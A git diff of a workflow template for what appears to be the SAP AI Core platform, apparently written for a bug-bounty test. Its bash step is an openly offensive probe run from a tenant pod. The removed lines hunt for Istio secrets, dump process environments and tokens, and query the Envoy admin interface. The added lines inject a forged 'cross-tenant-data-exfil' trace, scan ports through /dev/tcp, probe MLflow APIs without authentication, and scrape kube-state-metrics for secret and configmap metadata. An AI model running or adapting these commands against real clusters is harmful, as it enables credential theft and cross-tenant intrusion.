@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "23.0.0"
+    ai.sap.com/version: "24.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,75 +24,59 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V23 ISTIO BYPASS + USAGE API ==="
+        echo "=== V24 OTEL INJECTION + ML-TRACKING + LARGE KSM ==="
         
-        echo "=== ISTIO PROXY SDS UNIX SOCKET ==="
-        ls -la /var/run/secrets/ 2>/dev/null
-        ls -laR /var/run/secrets/istio/ 2>/dev/null
-        ls -la /etc/certs/ 2>/dev/null
-        find / -maxdepth 5 -name "istio-token" 2>/dev/null
-        find / -maxdepth 5 -name "root-cert.pem" 2>/dev/null
-        find / -maxdepth 5 -name "SDS" 2>/dev/null
-        
-        echo "=== CHECK PROC FOR ENVOY KEYS ==="
-        ls /proc/*/fd 2>/dev/null | head -5
-        cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
+        echo "=== OTEL TRACE INJECTION ==="
+        curl -s -X POST "http://otel-collector.opentelemetry.svc.cluster.local:4318/v1/traces" -H "Content-Type: application/json" -d '{"resourceSpans":[{"resource":{"attributes":[{"key":"service.name","value":{"stringValue":"attacker-injected-service"}},{"key":"malicious.tag","value":{"stringValue":"cross-tenant-data-exfil"}}]},"scopeSpans":[{"scope":{"name":"attack-probe"},"spans":[{"traceId":"d4cda95b652f4a1592b449d5929fda1b","spanId":"6e0c63257de34c92","name":"injected-operation","kind":1,"startTimeUnixNano":"1710340000000000000","endTimeUnixNano":"1710340001000000000","attributes":[{"key":"injection.test","value":{"stringValue":"poc-from-tenant-pod"}}]}]}]}]}' -w "\nHTTP: %{http_code}" 2>&1
         
         echo ""
-        echo "=== ENVOY ADMIN - MODIFY CLUSTER ROUTING ==="
-        echo "--- Current outbound config for Redis ---"
-        curl -s http://localhost:15000/config_dump 2>&1 | grep -A20 "redis.aicore" | head -25
-        
+        echo "=== ML-TRACKING WITH CURL AND HEADERS ==="
+        echo "--- No auth ---"
+        curl -s "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 200
         echo ""
-        echo "--- Try to disable mTLS via Envoy admin ---"
-        curl -s -X POST "http://localhost:15000/logging?connection=debug" 2>&1 | head -5
-        
+        echo "--- With AI-Resource-Group header ---"
+        curl -s -H "AI-Resource-Group: default" "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 200
         echo ""
-        echo "=== BYPASS ENVOY - USE LOCALHOST ADMIN TO PROXY ==="
-        echo "--- Direct TCP through envoy internal listener ---"
-        curl -s --connect-to redis.aicore.svc.cluster.local:6379:127.0.0.1:15001 http://redis.aicore.svc.cluster.local:6379/ 2>&1 | head -c 500
-        
-        echo ""
-        echo "=== USAGE API WITH XSUAA TOKEN ==="
-        XSUAA_TOKEN=$(cat /tmp/xsuaa-token.txt 2>/dev/null)
-        if [ -z "$XSUAA_TOKEN" ]; then
-          echo "No XSUAA token file, using env"
-          XSUAA_TOKEN="$AICORE_TOKEN"
-        fi
-        
-        echo "=== USAGE API ENDPOINTS ==="
-        for ep in "/" "/api" "/v1" "/v2" "/health" "/healthz" "/metrics" "/swagger" "/api-docs" "/openapi" "/usage" "/v2/usage" "/v2/admin/usage"; do
-          CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://usage-api-service.usage-api.svc.cluster.local${ep}" 2>&1)
-          echo "$CODE $ep"
+        echo "--- MLflow API endpoints ---"
+        for ep in "/api/2.0/mlflow/experiments/list" "/api/2.0/mlflow/runs/search" "/api/2.0/mlflow/registered-models/list" "/api/2.0/mlflow/artifacts/list" "/api/2.0/mlflow/metrics/get-history" "/ajax-api/2.0/mlflow/experiments/list"; do
+          echo -n "$ep: "
+          curl -s -w "%{http_code}" -o /tmp/mlresp "http://ml-tracking-service.ml-tracking.svc.cluster.local${ep}" 2>&1
+          echo " $(head -c 100 /tmp/mlresp)"
         done
         
         echo ""
-        echo "=== ML-TRACKING WITH OUR JWT ==="
-        echo "--- env vars with token ---"
-        env | grep -i token | head -5
-        env | grep -i auth | head -5
-        env | grep -i aicore | head -5
+        echo "=== ML-TRACKING INTERNAL PORT SCAN ==="
+        for port in 80 443 5000 8080 8443 9090 3306 5432; do
+          echo -n "Port $port: "
+          timeout 2 bash -c "echo > /dev/tcp/ml-tracking-service.ml-tracking.svc.cluster.local/$port" 2>&1 && echo "OPEN" || echo "closed"
+        done
         
         echo ""
-        echo "=== ENVOY STATS ==="
-        curl -s http://localhost:15000/stats 2>&1 | grep -E "(upstream_cx|downstream_cx|ssl|mtls)" | head -30
+        echo "=== FULL KSM - ALL NAMESPACES ==="
+        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "^kube_namespace_" | head -50
         
         echo ""
-        echo "=== ENVOY CONFIG DUMP - SECRETS SECTION SIZE ==="
-        FULL=$(curl -s http://localhost:15000/config_dump 2>&1)
-        echo "Full config: $(echo $FULL | wc -c) bytes"
-        echo "$FULL" | grep -c "inline_bytes"
-        echo "Unique services in routes:"
-        echo "$FULL" | grep -oE '"cluster": "[^"]*"' | sort -u | head -30
+        echo "=== KSM - SECRETS METADATA ==="
+        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "^kube_secret" | head -30
         
         echo ""
-        echo "=== KSM NEW CHECK - BB PARTICIPANT PODS ==="
-        curl -s http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics 2>&1 | grep -E "kube_pod_info.*rg-" | grep -v "rg-3ba0e0a4" | head -20
+        echo "=== KSM - CONFIGMAPS ==="
+        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "^kube_configmap" | head -30
         
         echo ""
-        echo "=== OTEL COLLECTOR ==="
-        curl -s http://otel-collector.opentelemetry.svc.cluster.local:4317/ 2>&1 | head -c 500
-        curl -s http://otel-collector.opentelemetry.svc.cluster.local:4318/ 2>&1 | head -c 500
-        curl -s http://otel-collector.opentelemetry.svc.cluster.local:4318/v1/traces 2>&1 | head -c 500
+        echo "=== KSM-CUSTOM - ALL METRICS ==="
+        curl -s "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | head -100
         
-        echo "=== V23 DONE ==="
+        echo ""
+        echo "=== KSM-MULTI - CRONJOBS WITH SCHEDULES ==="
+        curl -s "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_cronjob" | head -30
+        
+        echo ""
+        echo "=== DYNATRACE OTEL ==="
+        curl -s -X POST "http://otel-collector.dynatrace.svc.cluster.local:4317/" -H "Content-Type: application/json" -d '{}' -w "\nHTTP: %{http_code}" 2>&1 | head -c 500
+        
+        echo ""
+        echo "=== SCRAPER METRICS ==="
+        curl -s "http://otel-scraper-collector-monitoring.opentelemetry.svc.cluster.local:8888/metrics" 2>&1 | head -c 2000
+        
+        echo "=== V24 DONE ==="
